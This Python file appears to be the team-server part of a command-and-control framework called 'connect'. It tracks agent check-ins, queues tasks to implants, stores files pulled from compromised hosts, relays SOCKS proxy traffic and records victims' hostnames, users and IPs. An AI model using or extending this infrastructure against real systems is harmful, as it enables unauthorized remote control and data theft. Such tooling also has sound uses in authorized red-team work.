import datetime
import os
import json

from connect import output
from connect import convert
from connect import generate
from connect.team_server.models import  AgentModel, TaskModel

class ResultsManager:

    ERROR_BANNERS = {
        -32700: 'Failed to parse the batch request.',
        -32600: 'Failed to process a task.',
        -32601: 'Unsupported command.',
        -32602: 'Invalid parameters for task'
    }

    def __init__(self, db, sio_server):
        self.db = db
        self.sio_server = sio_server
        self.task_types = {
            0: self.check_in_task,
            1: self.text_task,
            2: self.file_task,
            3: self.socks_task
        }

    # TASK FUNCTIONS #

    def check_in_task(self, task, _, error):
        agent = task.agent

        # Should notify operators the agent is connected?
        if datetime.datetime.fromtimestamp(823879740.0) == agent.check_in:
            self.sio_server.emit('agent_connected', {'agent': agent.get_agent()})
        agent.check_in = datetime.datetime.now()
        self.commit([agent])

        if error:
            self.error_message(task, error)
            error_code = error['code']
            if error_code in [-32700]:
                return []
        return self.unsent_tasks(agent)

    def text_task(self, task, result, error):
        if error:
            self.error_message(task, error)
        if result:
            result = self.reserved_text_tasks_parser(task, result)
            self.result_message(task, result)
        return []

    def file_task(self, task, result, error):
        if error:
            self.error_message(task, error)
        if result:
            file_contents = convert.base64_to_bytes(result)
            filename = f'{os.getcwd()}/instance/downloads/{generate.string_identifier()}'
            task.results = filename
            with open(filename, 'wb') as fd:
                fd.write(file_contents)
            self.result_message(task, filename)
        return []

    def socks_task(self, task, result, _):
        if task.name == 'socks_disconnect':
            socks_downstream_client_id = convert.base64_to_string(task.parameters[1])
            for task in TaskModel.query.filter_by(agent=task.agent).filter_by(name='socks_downstream').all():
                if convert.base64_to_string(task.parameters[1]) == socks_downstream_client_id:
                    task.sent = datetime.datetime.now()
                    self.commit([task])
        if result:
            if task.name == 'socks_connect':
                self.sio_server.emit('socks_connect', convert.base64_to_string(result))
            if task.name == 'socks_downstream':
                results = convert.base64_to_string(result)
                self.sio_server.emit(f'socks_downstream', results)
        return []

    # AUXILLARY FUNCTIONS #

    def unsent_tasks(self, agent):
        unsent_tasks = []
        for unsent_task in agent.tasks:
            if unsent_task.sent == datetime.datetime.fromtimestamp(823879740.0):
                unsent_tasks.append({
                    "jsonrpc": "2.0", 
                    "name": unsent_task.name, 
                    "parameters": unsent_task.parameters,
                    "id": str(unsent_task.id)
                })
                self.sio_server.emit('success', f'Tasked agent {agent.name} to {unsent_task.description}.')
                continue
            if unsent_task.sent:
                continue
            unsent_task.sent = datetime.datetime.now()
            self.commit([unsent_task])
            unsent_tasks.append({
                "jsonrpc": "2.0", 
                "name": unsent_task.name, 
                "parameters": unsent_task.parameters,
                "id": str(unsent_task.id)
            })
            self.sio_server.emit('success', f'Tasked agent {agent.name} to {unsent_task.description}.')
        return unsent_tasks
    
    def commit(self, models: list):
        """
        Commits model object changes to the database.
        :param models: A list of models.
        """
        for model in models:
            self.db.session.add(model)
        self.db.session.commit()

    def error_message(self, task, error):
        error_result = error['message']
        task.completed = datetime.datetime.now()
        task.results = error_result
        self.commit([task])
        if task.type < 0:
            return 
        agent = task.agent
        error_banner = self.ERROR_BANNERS[error['code']]
        self.sio_server.emit(f'task_error', f'{{"banner":"{agent.name} {error_banner} ",'
                                        f'"results":"{error_result}"}}')                       

    def result_message(self, task, result):
        task.completed = datetime.datetime.now()
        task.results = result
        self.commit([task])
        if task.type < 0:
            return 
        agent = task.agent
        event = 'task_results'
        event_banner = f'{{"banner":"Task results from {agent.name}:",' f'"results":"{result}"}}'
        self.sio_server.emit(
            event,
            event_banner 
        )

    def reserved_text_tasks_parser(self, task, result):
        if not isinstance(result, list):
            return result
        
        agent = task.agent
        command = task.name

        task_result = result[0]
        task_property = convert.base64_to_string(result[1])

        if command == 'hostname':
            agent.hostname = task_property
        if command == 'whoami':
            agent.username = task_property
        if command == 'pid':
            agent.pid = task_property
        if command == 'ip':
            agent.ip = task_property
        if command == 'os':
            agent.os = task_property

        return task_result


class TaskManager:

    def __init__(self, db, sio_server):
        self.db = db
        self.sio_server = sio_server
        self.results_manager = ResultsManager(db, sio_server)
    
    def process_tasks(self, batch_response):
        batch_request = []
        for task in batch_response:
            if not isinstance(task, dict):
                output.display('ERROR', f'Task not formatted properly: {task}')
                continue
            task_id = task['id'] if 'id' in task.keys() else None
            result = task['result'] if 'result' in task.keys() else None
            error = task['error'] if 'error' in task.keys() else None
            task = TaskModel.query.filter_by(id=task_id).first()
            if not task:
                output.display('ERROR', 'Failed to retrieve task from batch_response.')
                if error:
                    output.display('ERROR', self.results_manager.ERROR_BANNERS[error['code']])
                    output.display('DEFAULT', error)  
                if result:
                    output.display('DEFAULT', result)
                continue
            batch_request.extend(self.results_manager.task_types[task.type](task, result, error))
        return batch_request